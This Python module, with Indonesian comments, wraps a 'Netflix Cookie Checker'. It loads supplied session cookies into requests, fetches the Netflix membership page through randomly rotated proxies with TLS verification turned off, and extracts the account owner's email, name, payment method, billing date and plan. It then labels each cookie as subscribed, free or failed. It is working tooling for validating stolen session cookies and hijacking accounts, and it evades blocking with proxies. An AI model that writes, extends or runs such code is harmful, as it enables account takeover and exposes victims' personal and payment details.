"""
checker.py — Wrapper untuk logika Netflix Cookie Checker
Menggunakan fungsi-fungsi dari Netflix-Cookie-Checker-main/main.py
"""
import sys
import os
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Import core functions from local netflix_checker_main.py
try:
    from .netflix_checker_main import (
        extract_netflix_cookie_bundles,
        cookies_dict_from_netscape,
        has_required_netflix_cookies,
        extract_info,
        derive_plan_info,
        derive_output_plan_bucket,
        is_subscribed_account,
        is_on_hold_account,
        is_extra_member_account,
        decode_netflix_value,
        normalize_plan_key,
        get_canonical_output_label,
    )
    CHECKER_AVAILABLE = True
except ImportError as e:
    CHECKER_AVAILABLE = False
    print(f"[WARNING] Could not import netflix checker: {e}")

# Global state for cancelling
checker_state = {'cancel': False}

def cancel_checking():
    checker_state['cancel'] = True

def is_cancelled():
    return checker_state['cancel']

def reset_checker_state():
    checker_state['cancel'] = False



def check_single_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    """
    Proses satu cookie string dan kembalikan info akun.
    Returns dict dengan keys:
      status: 'success'|'free'|'failed'|'error'
      info: dict account info
      plan_key, plan_name, country, is_on_hold
      cookie_text: normalized netscape text
      error_reason: str (jika gagal)
    """
    if is_cancelled():
        return {'status': 'cancelled'}

    if not CHECKER_AVAILABLE:
        return {'status': 'error', 'error_reason': 'Checker module not available'}

    try:
        bundles = extract_netflix_cookie_bundles(cookie_text)
        if not bundles:
            return {'status': 'failed', 'error_reason': 'Cookie tidak valid / tidak mengandung Netflix cookies'}

        bundle = bundles[0]
        netscape_text = bundle.get('netscape_text', '')
        cookies = bundle.get('cookies') or cookies_dict_from_netscape(netscape_text)

        if not cookies or not has_required_netflix_cookies(cookies):
            return {'status': 'failed', 'error_reason': 'Missing required cookie: NetflixId'}

        if is_cancelled(): return {'status': 'cancelled'}

        # Setup session
        session = requests.Session()
        session.cookies.update(cookies)

        headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/124.0.0.0 Safari/537.36'
            ),
            'Accept-Encoding': 'identity',
        }

        max_retries = 5 if proxy_list else 1
        last_result = None

        for attempt in range(max_retries):
            if is_cancelled(): return {'status': 'cancelled'}

            req_proxies = None
            if proxy_list:
                import random
                proxy = random.choice(proxy_list)
                if isinstance(proxy, dict):
                    req_proxies = proxy
                else:
                    if "://" not in proxy:
                        proxy = f"http://{proxy}"
                    req_proxies = {'http': proxy, 'https': proxy}

            try:
                response = session.get(
                    'https://www.netflix.com/account/membership',
                    headers=headers,
                    proxies=req_proxies,
                    timeout=20,
                    verify=False,
                )

                if is_cancelled(): return {'status': 'cancelled'}

                if response.status_code != 200:
                    last_result = {
                        'status': 'error',
                        'error_reason': f'HTTP {response.status_code}'
                    }
                    continue

                info = extract_info(response.text)
                if not info or not info.get('countryOfSignup'):
                    last_result = {'status': 'error', 'error_reason': 'Tidak bisa membaca info akun (mungkin proxy diblokir)'}
                    continue

                subscribed = is_subscribed_account(info)
                on_hold = is_on_hold_account(info) if subscribed else False
                plan_key, plan_name = derive_plan_info(info, subscribed)

                status = 'success' if subscribed else 'free'

                return {
                    'status': status,
                    'cookie_text': netscape_text,
                    'plan_key': plan_key,
                    'plan_name': plan_name,
                    'country': decode_netflix_value(info.get('countryOfSignup')) or 'Unknown',
                    'is_on_hold': on_hold,
                    'email': decode_netflix_value(info.get('email')),
                    'account_name': decode_netflix_value(info.get('accountOwnerName')),
                    'quality': decode_netflix_value(info.get('videoQuality')),
                    'max_streams': decode_netflix_value(info.get('maxStreams')),
                    'plan_price': decode_netflix_value(info.get('planPrice')),
                    'next_billing': decode_netflix_value(info.get('nextBillingDate')),
                    'payment_method': decode_netflix_value(info.get('paymentMethodType')),
                    'member_since': decode_netflix_value(info.get('memberSince')),
                    'extra_members': decode_netflix_value(info.get('showExtraMemberSection')),
                    'profiles': decode_netflix_value(info.get('profiles')),
                    'hold_status': decode_netflix_value(info.get('holdStatus')),
                    'membership_status': decode_netflix_value(info.get('membershipStatus')),
                }

            except requests.exceptions.Timeout:
                last_result = {'status': 'error', 'error_reason': 'Proxy Timeout / Sangat Lambat'}
            except requests.exceptions.ProxyError:
                last_result = {'status': 'error', 'error_reason': 'Proxy Error / Koneksi Ditolak'}
            except requests.exceptions.RequestException as e:
                err_str = str(e)
                if "Max retries exceeded" in err_str:
                    last_result = {'status': 'error', 'error_reason': 'Proxy Mati / Tidak Terhubung'}
                elif "Connection aborted" in err_str:
                    last_result = {'status': 'error', 'error_reason': 'Koneksi Terputus Tiba-tiba'}
                else:
                    last_result = {'status': 'error', 'error_reason': err_str.split(':', 1)[-1].strip()[:50]}
            except Exception as e:
                last_result = {'status': 'error', 'error_reason': 'Parsing error / Cookie kadaluarsa'}

        return last_result

    except Exception as e:
        return {'status': 'error', 'error_reason': 'Parsing error / Cookie kadaluarsa'}


def parse_proxy_text(proxy_text: str) -> list:
    """Parse proxy list dari text area input."""
    if not CHECKER_AVAILABLE:
        return []
    try:
        from .netflix_checker_main import _parse_proxy_line
        proxies = []
        for line in proxy_text.splitlines():
            p = _parse_proxy_line(line)
            if p:
                proxies.append(p)
        return proxies
    except Exception:
        return []
